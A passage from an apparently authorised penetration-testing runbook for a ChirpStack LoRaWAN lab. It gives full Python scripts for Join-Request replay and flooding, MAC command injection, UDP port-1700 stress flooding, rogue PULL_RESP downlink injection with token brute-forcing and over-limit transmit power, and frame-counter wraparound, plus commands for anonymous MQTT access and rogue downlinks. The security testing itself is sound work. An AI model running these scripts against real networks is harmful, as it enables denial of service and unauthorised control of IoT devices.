- ChirpStack logs: `validate mic error: invalid mic` for every injected tampered frame.
- Zero tampered frames produce an MQTT application uplink event.

---

### PT-006: OTAA Join-Request DevNonce Replay & Flood

**Objective**: Replay previously observed Join-Request packets to verify DevNonce uniqueness enforcement, then flood with rapid Join-Requests to test rate limiting.

**Severity**: High

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt006_join_replay_flood.py`:

~~~python
#!/usr/bin/env python3
"""
PT-006: OTAA Join-Request DevNonce Replay & Flood
Tests DevNonce replay rejection and Join-Request rate limiting on ChirpStack.
"""

import socket
import json
import struct
import time
import os
import random
import base64
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# Join-Request structure (LoRaWAN 1.0.x):
# MHDR (1) | AppEUI (8) | DevEUI (8) | DevNonce (2) | MIC (4) = 23 bytes total
# MType = 000 (Join-Request) -> MHDR = 0x00

# Replace these with actual captured values from your lab devices
APPEUI = "0000000000000000"  # AppEUI / JoinEUI (MSB)
DEVEUI = "A840411F31824150"  # DevEUI of Dragino LSN50v2 (example — replace with actual)


def build_fake_join_request(devnonce: int) -> str:
    """
    Build a synthetic Join-Request PHYPayload.
    NOTE: The MIC will be invalid since we don't have the AppKey.
    This tests whether the server even processes the frame before MIC check.
    """
    mhdr = bytes([0x00])  # MType=000 (Join-Request), Major=00
    appeui = bytes.fromhex(APPEUI)
    deveui = bytes.fromhex(DEVEUI)
    devnonce_bytes = struct.pack("<H", devnonce)  # Little-endian 2 bytes
    mic = bytes([0x00, 0x00, 0x00, 0x00])  # Invalid MIC (intentional)

    phypayload = mhdr + appeui + deveui + devnonce_bytes + mic
    return base64.b64encode(phypayload).decode("utf-8")


def build_semtech_packet(phypayload_b64: str, token: int) -> bytes:
    """Wrap PHYPayload in a Semtech UDP PUSH_DATA packet."""
    header = struct.pack(">BHB", 0x02, token, 0x00)
    eui_bytes = bytes.fromhex(GATEWAY_EUI)
    rxpk = {
        "rxpk": [{
            "tmst": int(time.time()) & 0xFFFFFFFF,
            "chan": 0, "rfch": 0, "freq": 923.2,
            "stat": 1, "modu": "LORA", "datr": "SF12BW125", "codr": "4/5",
            "lsnr": 9.5, "rssi": -45,
            "size": len(base64.b64decode(phypayload_b64)),
            "data": phypayload_b64
        }]
    }
    return header + eui_bytes + json.dumps(rxpk).encode("utf-8")


def run_devnonce_replay_test():
    """Phase 1: DevNonce replay attack."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt006-devnonce-replay-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 72)
    print("  PT-006 Phase 1: DevNonce Replay Attack")
    print("=" * 72)

    # Use the same DevNonce value repeatedly
    fixed_nonce = 0x0042
    results = []

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    for attempt in range(5):
        print(f"\n[REPLAY {attempt+1}/5] Sending Join-Request with DevNonce=0x{fixed_nonce:04X}")
        payload_b64 = build_fake_join_request(fixed_nonce)
        packet = build_semtech_packet(payload_b64, token=0xDD00 + attempt)

        sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            response, _ = sock.recvfrom(4096)
            result = f"TRANSPORT_ACK ({response.hex()})"
        except socket.timeout:
            result = "DROPPED"

        results.append(f"REPLAY_{attempt+1} | DevNonce=0x{fixed_nonce:04X} | {result}")
        print(f"  -> {result}")
        time.sleep(0.5)

    sock.close()

    with open(evidence_file, "w") as f:
        f.write(f"PT-006 Phase 1: DevNonce Replay Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence: {evidence_file}")


def run_join_flood_test(count: int = 100, delay: float = 0.05):
    """Phase 2: Join-Request flood with unique DevNonces to test rate limiting."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt006-join-flood-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("\n" + "=" * 72)
    print(f"  PT-006 Phase 2: Join-Request Flood ({count} requests)")
    print("=" * 72)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.5)

    accepted = 0
    dropped = 0
    start_time = time.time()

    for i in range(count):
        nonce = random.randint(0x0000, 0xFFFF)
        payload_b64 = build_fake_join_request(nonce)
        packet = build_semtech_packet(payload_b64, token=0xEE00 + (i % 256))
        sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            sock.recvfrom(4096)
            accepted += 1
        except socket.timeout:
            dropped += 1

        if (i + 1) % 25 == 0:
            elapsed = time.time() - start_time
            rate = (i + 1) / elapsed
            print(f"  [{i+1}/{count}] Rate: {rate:.1f} pkt/s | Accepted: {accepted} | Dropped: {dropped}")

        time.sleep(delay)

    elapsed = time.time() - start_time
    sock.close()

    summary = (
        f"Total Sent: {count}\n"
        f"Transport Accepted: {accepted}\n"
        f"Dropped/Timeout: {dropped}\n"
        f"Duration: {elapsed:.2f}s\n"
        f"Average Rate: {count/elapsed:.1f} pkt/s\n"
    )

    with open(evidence_file, "w") as f:
        f.write(f"PT-006 Phase 2: Join-Request Flood Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write("=" * 72 + "\n")
        f.write(summary)

    print(f"\n{summary}")
    print(f"[+] Evidence: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_devnonce_replay_test()
    run_join_flood_test(count=100, delay=0.05)
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt006_join_replay_flood.py
~~~

**Post-Attack Correlation**:
~~~bash
docker logs chirpstack --tail 200 | grep -i -E "devnonce|join|replay|rate|limit|flood"
~~~

---

### PT-007: MQTT Broker Unauthenticated Access & Topic Enumeration

**Objective**: Determine if the MQTT broker accepts anonymous connections and enumerate accessible topics containing sensitive device data.

**Severity**: Critical (if anonymous access granted)

**Procedure**:

1. Attempt anonymous wildcard subscription:
    ~~~bash
    timeout 15 mosquitto_sub -h 192.168.23.137 -p 1883 -t "#" -v \
      2>&1 | tee ~/lorawan-lab/pentest/evidence/pt007-mqtt-wildcard.log
    ~~~

2. Attempt to subscribe to ChirpStack-specific MQTT topics:
    ~~~bash
    # Device uplink events
    timeout 15 mosquitto_sub -h 192.168.23.137 -t "application/+/device/+/event/up" -v \
      2>&1 | tee ~/lorawan-lab/pentest/evidence/pt007-mqtt-uplink.log

    # Device join events
    timeout 15 mosquitto_sub -h 192.168.23.137 -t "application/+/device/+/event/join" -v \
      2>&1 | tee ~/lorawan-lab/pentest/evidence/pt007-mqtt-join.log

    # Gateway events
    timeout 15 mosquitto_sub -h 192.168.23.137 -t "gateway/+/event/+" -v \
      2>&1 | tee ~/lorawan-lab/pentest/evidence/pt007-mqtt-gateway.log
    ~~~

3. Attempt rogue downlink injection via MQTT publish:
    ~~~bash
    # Attempt to publish a fake downlink command
    mosquitto_pub -h 192.168.23.137 -p 1883 \
      -t "application/1/device/a840411f31824150/command/down" \
      -m '{"devEui":"a840411f31824150","confirmed":false,"fPort":1,"data":"AQIDBA=="}' \
      2>&1 | tee ~/lorawan-lab/pentest/evidence/pt007-mqtt-rogue-downlink.log
    ~~~

**Pass/Fail Matrix**:

| Test | Finding | Severity |
|---|---|---|
| Anonymous wildcard subscription succeeds | Unauthorized data exfiltration possible | **CRITICAL** |
| Uplink topic readable without auth | Sensor telemetry exposed | **HIGH** |
| Downlink command injection accepted | Remote device control possible | **CRITICAL** |
| All anonymous access rejected | Broker properly secured | **PASS** |

---

### PT-008: MAC Command Injection Attack

**Objective**: Inject rogue LoRaWAN MAC commands (`LinkADRReq`, `DevStatusReq`, `RXParamSetupReq`) via crafted downlink frames to test whether ChirpStack validates MAC command origin authenticity.

**Severity**: Medium

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt008_mac_cmd_inject.py`:

~~~python
#!/usr/bin/env python3
"""
PT-008: MAC Command Injection
Crafts and injects LoRaWAN frames containing rogue MAC commands in FOpts
to test server-side MAC command validation and endpoint protection.
"""

import socket
import json
import struct
import time
import os
import base64
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# LoRaWAN MAC Command CIDs (Network Server -> End Device)
MAC_COMMANDS = {
    "LinkADRReq": {
        "cid": 0x03,
        "payload": bytes([
            0x50,  # DataRate_TXPower (DR5, TXPow0)
            0xFF, 0x00,  # ChMask (all channels enabled)
            0x00   # Redundancy (NbTrans=0, ChMaskCntl=0)
        ]),
        "description": "Forces device to change data rate and TX power"
    },
    "RXParamSetupReq": {
        "cid": 0x05,
        "payload": bytes([
            0x05,        # DLsettings (RX1DRoffset=0, RX2DataRate=DR5)
            0x84, 0xAC, 0x09  # Frequency (fake 923.3 MHz in 100Hz steps, little-endian)
        ]),
        "description": "Attempts to redirect device RX windows to attacker-controlled frequency"
    },
    "DevStatusReq": {
        "cid": 0x06,
        "payload": bytes([]),  # No payload needed
        "description": "Solicits battery and SNR status from device"
    },
    "NewChannelReq": {
        "cid": 0x07,
        "payload": bytes([
            0x03,              # ChIndex
            0x84, 0xAC, 0x09,  # Freq (923.3 MHz)
            0x50               # DrRange (DR0-DR5)
        ]),
        "description": "Creates a new channel on the device"
    },
    "DutyCycleReq": {
        "cid": 0x04,
        "payload": bytes([0x0F]),  # MaxDCycle = 15 (very restrictive)
        "description": "Attempts to throttle device TX duty cycle to near-zero"
    }
}


def build_mac_command_frame(mac_cmd_name: str, devaddr: str = "01020304",
                            fcnt: int = 999) -> str:
    """
    Build a LoRaWAN downlink frame (Unconfirmed Data Down) with MAC commands
    piggybacked in FOpts field.

    PHYPayload structure:
      MHDR (1) | DevAddr (4) | FCtrl (1) | FCnt (2) | FOpts (N) | MIC (4)
    """
    cmd = MAC_COMMANDS[mac_cmd_name]
    fopts = bytes([cmd["cid"]]) + cmd["payload"]
    fopts_len = len(fopts)

    if fopts_len > 15:
        print(f"  [!] FOpts too long ({fopts_len} > 15), truncating")
        fopts = fopts[:15]
        fopts_len = 15

    # MHDR: MType=011 (Unconfirmed Data Down), Major=00 -> 0x60
    mhdr = bytes([0x60])

    # DevAddr (little-endian)
    devaddr_bytes = bytes.fromhex(devaddr)[::-1]  # Reverse for LE

    # FCtrl: ADR=0, ACK=0, FPending=0, FOptsLen=fopts_len
    fctrl = bytes([fopts_len & 0x0F])

    # FCnt (little-endian, 2 bytes)
    fcnt_bytes = struct.pack("<H", fcnt)

    # No FPort, no FRMPayload (MAC commands only in FOpts)
    # Fake MIC (will fail validation — testing if server processes the MAC commands)
    mic = bytes([0xDE, 0xAD, 0xBE, 0xEF])

    phypayload = mhdr + devaddr_bytes + fctrl + fcnt_bytes + fopts + mic
    return base64.b64encode(phypayload).decode("utf-8")


def build_semtech_pull_resp(phypayload_b64: str, token: int) -> bytes:
    """
    Build a Semtech UDP PULL_RESP packet (downlink injection).

    Semtech protocol:
      [0]    Protocol Version  = 0x02
      [1-2]  Token             = from matched PULL_DATA
      [3]    Packet Type       = 0x03 (PULL_RESP)
      [4+]   JSON txpk payload
    """
    header = struct.pack(">BHB", 0x02, token, 0x03)

    txpk = {
        "txpk": {
            "imme": True,
            "freq": 923.2,
            "rfch": 0,
            "powe": 14,
            "modu": "LORA",
            "datr": "SF7BW125",
            "codr": "4/5",
            "ipol": True,
            "size": len(base64.b64decode(phypayload_b64)),
            "data": phypayload_b64
        }
    }
    return header + json.dumps(txpk).encode("utf-8")


def run_mac_injection_test():
    """Execute MAC command injection across all command types."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt008-mac-inject-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 72)
    print("  PT-008: MAC Command Injection Attack")
    print("=" * 72)

    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    for idx, (cmd_name, cmd_info) in enumerate(MAC_COMMANDS.items(), start=1):
        print(f"\n[ATTACK {idx}] Injecting rogue {cmd_name} (CID=0x{cmd_info['cid']:02X})")
        print(f"  Description: {cmd_info['description']}")

        payload_b64 = build_mac_command_frame(cmd_name, fcnt=900 + idx)

        # Try as PUSH_DATA (uplink spoofing with MAC commands)
        push_header = struct.pack(">BHB", 0x02, 0xFF00 + idx, 0x00)
        eui_bytes = bytes.fromhex(GATEWAY_EUI)
        rxpk = {
            "rxpk": [{
                "tmst": int(time.time()) & 0xFFFFFFFF,
                "chan": 0, "rfch": 0, "freq": 923.2,
                "stat": 1, "modu": "LORA", "datr": "SF7BW125", "codr": "4/5",
                "lsnr": 9.5, "rssi": -45,
                "size": len(base64.b64decode(payload_b64)),
                "data": payload_b64
            }]
        }
        push_packet = push_header + eui_bytes + json.dumps(rxpk).encode("utf-8")
        sock.sendto(push_packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            response, _ = sock.recvfrom(4096)
            result = f"TRANSPORT_ACK ({response.hex()})"
        except socket.timeout:
            result = "DROPPED"

        entry = f"CMD={cmd_name} | CID=0x{cmd_info['cid']:02X} | {result}"
        results.append(entry)
        print(f"  -> {result}")

        # Also try as PULL_RESP (downlink injection)
        pull_resp = build_semtech_pull_resp(payload_b64, token=0xAA00 + idx)
        sock.sendto(pull_resp, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))
        print(f"  -> Also sent as PULL_RESP (downlink injection path)")

        time.sleep(0.5)

    sock.close()

    with open(evidence_file, "w") as f:
        f.write(f"PT-008 MAC Command Injection Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_mac_injection_test()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt008_mac_cmd_inject.py
~~~

**Post-Attack Correlation**:
~~~bash
# Check if any MAC commands were processed
docker logs chirpstack --tail 200 | grep -i -E "mac.command|adr|rxparam|status|channel|duty"
~~~

---

### PT-009: UDP Port 1700 Resource Exhaustion (Stress Test)

**Objective**: Determine the resilience of ChirpStack Gateway Bridge under high-volume UDP traffic on port 1700.

**Severity**: Medium

> [!WARNING]
> This test generates high-volume network traffic. Execute only on isolated lab networks with explicit authorization.

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt009_udp_stress.py`:

~~~python
#!/usr/bin/env python3
"""
PT-009: UDP Port 1700 Resource Exhaustion Stress Test
Floods the Gateway Bridge with high-volume Semtech UDP packets to measure
performance degradation, packet loss thresholds, and resource consumption.
"""

import socket
import json
import struct
import time
import os
import random
import threading
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# Stress test parameters
PHASES = [
    {"name": "Warm-Up",     "pps": 10,   "duration_sec": 10},
    {"name": "Moderate",    "pps": 100,  "duration_sec": 15},
    {"name": "Heavy",       "pps": 500,  "duration_sec": 15},
    {"name": "Burst",       "pps": 1000, "duration_sec": 10},
    {"name": "Cool-Down",   "pps": 10,   "duration_sec": 10},
]


def build_stress_packet(token: int) -> bytes:
    """Build a lightweight Semtech PUSH_DATA packet for stress testing."""
    header = struct.pack(">BHB", 0x02, token & 0xFFFF, 0x00)
    eui = bytes.fromhex(GATEWAY_EUI)
    rxpk = {"rxpk": [{"freq": 923.2, "data": "AAAA", "datr": "SF7BW125", "modu": "LORA"}]}
    return header + eui + json.dumps(rxpk, separators=(",", ":")).encode("utf-8")


def measure_response_rate(host: str, port: int, sample_count: int = 10) -> float:
    """Measure the server's response rate (% of PUSH_ACKs received)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)
    acks = 0

    for i in range(sample_count):
        packet = build_stress_packet(0xF000 + i)
        sock.sendto(packet, (host, port))
        try:
            sock.recvfrom(256)
            acks += 1
        except socket.timeout:
            pass
        time.sleep(0.1)

    sock.close()
    return (acks / sample_count) * 100


def run_stress_test():
    """Execute phased UDP stress test with response rate monitoring."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt009-udp-stress-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 72)
    print("  PT-009: UDP Port 1700 Resource Exhaustion Stress Test")
    print("=" * 72)

    # Pre-test baseline
    print("\n[*] Measuring pre-test baseline response rate...")
    baseline_rate = measure_response_rate(CHIRPSTACK_HOST, CHIRPSTACK_PORT)
    print(f"  Baseline response rate: {baseline_rate:.0f}%")

    results = [f"BASELINE_RESPONSE_RATE={baseline_rate:.0f}%"]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    total_sent = 0

    for phase in PHASES:
        phase_name = phase["name"]
        target_pps = phase["pps"]
        duration = phase["duration_sec"]
        interval = 1.0 / target_pps if target_pps > 0 else 1.0

        print(f"\n[PHASE: {phase_name}] Target: {target_pps} pkt/s for {duration}s")

        phase_sent = 0
        phase_start = time.time()

        while (time.time() - phase_start) < duration:
            token = random.randint(0, 0xFFFF)
            packet = build_stress_packet(token)
            sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))
            phase_sent += 1
            total_sent += 1

            # Pace to target PPS
            elapsed = time.time() - phase_start
            expected = phase_sent * interval
            drift = expected - elapsed
            if drift > 0:
                time.sleep(drift)

        actual_pps = phase_sent / duration
        print(f"  Sent: {phase_sent} packets | Actual: {actual_pps:.1f} pkt/s")

        # Mid-phase response rate measurement
        mid_rate = measure_response_rate(CHIRPSTACK_HOST, CHIRPSTACK_PORT, sample_count=5)
        print(f"  Response rate during {phase_name}: {mid_rate:.0f}%")

        results.append(
            f"PHASE={phase_name} | TARGET_PPS={target_pps} | ACTUAL_PPS={actual_pps:.1f} "
            f"| SENT={phase_sent} | RESPONSE_RATE={mid_rate:.0f}%"
        )

    sock.close()

    # Post-test recovery measurement
    print("\n[*] Waiting 10 seconds for recovery...")
    time.sleep(10)
    recovery_rate = measure_response_rate(CHIRPSTACK_HOST, CHIRPSTACK_PORT)
    print(f"  Post-test recovery rate: {recovery_rate:.0f}%")
    results.append(f"RECOVERY_RESPONSE_RATE={recovery_rate:.0f}%")
    results.append(f"TOTAL_PACKETS_SENT={total_sent}")

    # Write evidence
    with open(evidence_file, "w") as f:
        f.write(f"PT-009 UDP Stress Test Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Target: {CHIRPSTACK_HOST}:{CHIRPSTACK_PORT}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Total packets sent: {total_sent}")
    print(f"[+] Evidence: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_stress_test()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt009_udp_stress.py
~~~

**Post-Test System Health Check**:
~~~bash
# Check Gateway Bridge container health
docker stats chirpstack-gateway-bridge --no-stream

# Check for dropped packets or errors
docker logs chirpstack-gateway-bridge --tail 50 | grep -i -E "error|drop|timeout|overflow"

# Verify normal operations resume
mosquitto_sub -h 192.168.23.137 -t "application/+/device/+/event/up" -C 1 -W 30
~~~

---

### PT-010: Downlink Injection via Rogue PULL_RESP

**Objective**: Attempt to inject unauthorized downlink frames by sending Semtech UDP `PULL_RESP` packets directly to the Gateway Bridge, bypassing ChirpStack's scheduling.

**Severity**: High

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt010_downlink_inject.py`:

~~~python
#!/usr/bin/env python3
"""
PT-010: Downlink Injection via Rogue PULL_RESP
Attempts to inject unauthorized downlink transmissions through the
Semtech UDP protocol by sending crafted PULL_RESP packets.
"""

import socket
import json
import struct
import time
import os
import base64
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")


def build_pull_resp(phypayload_b64: str, token: int, freq: float = 923.2,
                    immediate: bool = True, power: int = 14) -> bytes:
    """
    Build a Semtech UDP PULL_RESP packet to inject a downlink.

    PULL_RESP format:
      [0]    Protocol Version = 0x02
      [1-2]  Token (should match a PULL_DATA token from an active gateway)
      [3]    Packet Type = 0x03 (PULL_RESP)
      [4+]   JSON txpk payload
    """
    header = struct.pack(">BHB", 0x02, token, 0x03)
    txpk = {
        "txpk": {
            "imme": immediate,
            "freq": freq,
            "rfch": 0,
            "powe": power,
            "modu": "LORA",
            "datr": "SF7BW125",
            "codr": "4/5",
            "ipol": True,
            "size": len(base64.b64decode(phypayload_b64)),
            "ncrc": False,
            "data": phypayload_b64
        }
    }
    return header + json.dumps(txpk).encode("utf-8")


def run_downlink_injection():
    """Execute downlink injection attack with multiple strategies."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt010-downlink-inject-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    print("=" * 72)
    print("  PT-010: Downlink Injection via Rogue PULL_RESP")
    print("=" * 72)

    # Various downlink payloads to test
    # Fake Unconfirmed Data Down (MType=011, MHDR=0x60)
    # DevAddr=01020304, FCtrl=0x00, FCnt=1, FPort=1, FRMPayload=0xFF
    fake_downlink = base64.b64encode(
        bytes([0x60, 0x04, 0x03, 0x02, 0x01, 0x00, 0x01, 0x00, 0x01, 0xFF,
               0xDE, 0xAD, 0xBE, 0xEF])
    ).decode("utf-8")

    test_cases = [
        {
            "name": "Random Token (no PULL_DATA session)",
            "token": 0x1337,
            "payload": fake_downlink,
            "description": "Token doesn't match any active gateway PULL_DATA session"
        },
        {
            "name": "Brute-force token range (0x0000-0x000F)",
            "token_range": range(0x0000, 0x0010),
            "payload": fake_downlink,
            "description": "Attempt to guess an active PULL_DATA token"
        },
        {
            "name": "Immediate TX on alternative frequency",
            "token": 0x2222,
            "payload": fake_downlink,
            "freq": 923.8,
            "description": "Attempt to force gateway TX on non-standard frequency"
        },
        {
            "name": "Maximum TX power",
            "token": 0x3333,
            "payload": fake_downlink,
            "power": 30,  # Exceeds regulatory limits
            "description": "Attempt to force gateway to TX at illegal power level"
        }
    ]

    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    for test in test_cases:
        print(f"\n[ATTACK] {test['name']}")
        print(f"  {test['description']}")

        if "token_range" in test:
            # Brute-force token range
            for token in test["token_range"]:
                packet = build_pull_resp(
                    test["payload"], token,
                    freq=test.get("freq", 923.2),
                    power=test.get("power", 14)
                )
                sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

            result = f"SENT {len(test['token_range'])} PULL_RESP packets"
            print(f"  -> {result}")
        else:
            packet = build_pull_resp(
                test["payload"], test["token"],
                freq=test.get("freq", 923.2),
                power=test.get("power", 14)
            )
            sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

            try:
                response, _ = sock.recvfrom(4096)
                result = f"RESPONSE: {response.hex()}"
            except socket.timeout:
                result = "NO_RESPONSE"

            print(f"  -> {result}")

        results.append(f"{test['name']} | {result}")
        time.sleep(0.5)

    sock.close()

    with open(evidence_file, "w") as f:
        f.write(f"PT-010 Downlink Injection Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_downlink_injection()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt010_downlink_inject.py
~~~

**Post-Attack Correlation**:
~~~bash
docker logs chirpstack-gateway-bridge --tail 100 | grep -i -E "pull|resp|downlink|token|reject"
~~~

---

### PT-011: Frame Counter Overflow & Wraparound Exploitation

**Objective**: Test whether ChirpStack enforces 32-bit frame counters and properly handles the 16-bit FCnt boundary ($2^{16} - 1 = 65535$) where a 16-bit counter wraps around to zero.

**Severity**: High (CVSS 7.5) — Successful wraparound can re-enable replay attacks on all prior frames.

**STRIDE**: Denial of Service, Spoofing

**Attack Script** — Save as `~/lorawan-lab/pentest/scripts/pt011_fcnt_overflow.py`:

~~~python
#!/usr/bin/env python3
"""
PT-011: Frame Counter Overflow & Wraparound Exploitation
Tests server behavior at the 16-bit FCnt boundary (65535 -> 0) and
verifies whether 32-bit counter enforcement prevents wraparound resets.
"""

import socket
import json
import struct
import time
import os
import base64
from datetime import datetime, timezone

CHIRPSTACK_HOST = "192.168.23.137"
CHIRPSTACK_PORT = 1700
GATEWAY_EUI = "24E124FFFE0159C3"
EVIDENCE_DIR = os.path.expanduser("~/lorawan-lab/pentest/evidence")

# DevAddr of the target lab device (replace with actual)
TARGET_DEVADDR = "01020304"


def build_uplink_with_fcnt(devaddr_hex: str, fcnt: int) -> str:
    """
    Build a synthetic LoRaWAN Unconfirmed Data Up PHYPayload with a specific FCnt.
    MIC is intentionally invalid — we're testing server FCnt boundary handling.
    """
    mhdr = bytes([0x40])  # MType=010 (Unconfirmed Data Up), Major=00
    devaddr = bytes.fromhex(devaddr_hex)[::-1]  # Little-endian
    fctrl = bytes([0x00])  # No ADR, no ACK, FOptsLen=0

    # Use 2-byte FCnt in PHYPayload (LoRaWAN 1.0.x wire format)
    fcnt_wire = struct.pack("<H", fcnt & 0xFFFF)

    fport = bytes([0x01])  # Application port
    frmpayload = bytes([0xAA, 0xBB, 0xCC])  # Dummy payload
    mic = bytes([0x00, 0x00, 0x00, 0x00])  # Invalid MIC

    phypayload = mhdr + devaddr + fctrl + fcnt_wire + fport + frmpayload + mic
    return base64.b64encode(phypayload).decode("utf-8")


def build_semtech_push(payload_b64: str, token: int) -> bytes:
    """Wrap in Semtech UDP PUSH_DATA."""
    header = struct.pack(">BHB", 0x02, token, 0x00)
    eui = bytes.fromhex(GATEWAY_EUI)
    rxpk = {
        "rxpk": [{
            "tmst": int(time.time()) & 0xFFFFFFFF,
            "chan": 0, "rfch": 0, "freq": 923.2,
            "stat": 1, "modu": "LORA", "datr": "SF7BW125", "codr": "4/5",
            "lsnr": 9.5, "rssi": -45,
            "size": len(base64.b64decode(payload_b64)),
            "data": payload_b64
        }]
    }
    return header + eui + json.dumps(rxpk).encode("utf-8")


def run_fcnt_overflow_test():
    """Test FCnt behavior at critical boundary values."""
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    evidence_file = os.path.join(EVIDENCE_DIR, f"pt011-fcnt-overflow-{timestamp}.log")
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    # Critical FCnt values to test
    test_fcnts = [
        (65533, "Approaching 16-bit boundary"),
        (65534, "One before 16-bit max"),
        (65535, "16-bit maximum (0xFFFF)"),
        (0,     "Wraparound to zero"),
        (1,     "Post-wraparound increment"),
        (65535, "Re-test max after wraparound"),
        (0,     "Second wraparound attempt"),
    ]

    print("=" * 72)
    print("  PT-011: Frame Counter Overflow & Wraparound")
    print("=" * 72)

    results = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    for fcnt_val, description in test_fcnts:
        print(f"\n[TEST] FCnt={fcnt_val} (0x{fcnt_val:04X}) — {description}")
        payload_b64 = build_uplink_with_fcnt(TARGET_DEVADDR, fcnt_val)
        packet = build_semtech_push(payload_b64, token=0xAA00 + (fcnt_val & 0xFF))

        sock.sendto(packet, (CHIRPSTACK_HOST, CHIRPSTACK_PORT))

        try:
            response, _ = sock.recvfrom(4096)
            result = f"TRANSPORT_ACK"
        except socket.timeout:
            result = "DROPPED"

        entry = f"FCnt={fcnt_val} | DESC={description} | {result}"
        results.append(entry)
        print(f"  -> {result}")
        time.sleep(0.3)

    sock.close()

    with open(evidence_file, "w") as f:
        f.write(f"PT-011 FCnt Overflow Test Results\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Target DevAddr: {TARGET_DEVADDR}\n")
        f.write("=" * 72 + "\n")
        for line in results:
            f.write(line + "\n")

    print(f"\n[+] Evidence: {evidence_file}")
    print("=" * 72)


if __name__ == "__main__":
    run_fcnt_overflow_test()
~~~

**Execution**:
~~~bash
python3 ~/lorawan-lab/pentest/scripts/pt011_fcnt_overflow.py
~~~

**Post-Attack Correlation**:
~~~bash
docker logs chirpstack --tail 100 | grep -i -E "fcnt|frame.counter|overflow|wraparound|rollback|16.bit|32.bit"
~~~

**Expected Result**:
- If ChirpStack enforces 32-bit frame counters: wraparound from 65535→0 should trigger a `frame counter rolled back` rejection.
- If only 16-bit counters are used: the wraparound succeeds silently — **this is a finding** because it re-enables replay attacks on all 65535 prior frames.

**Remediation**: Configure ChirpStack device profiles to enforce `Supports 32-bit FCnt = true`.

---

### PT-012: ABP Activation Mode Audit & Device Enumeration

**Objective**: Detect any devices using Activation By Personalization (ABP) instead of OTAA, and assess the risk of static session key exposure.

**Severity**: High (CVSS 7.2) — ABP devices use permanent, non-rotating session keys.

**STRIDE**: Spoofing, Information Disclosure

**Procedure**:

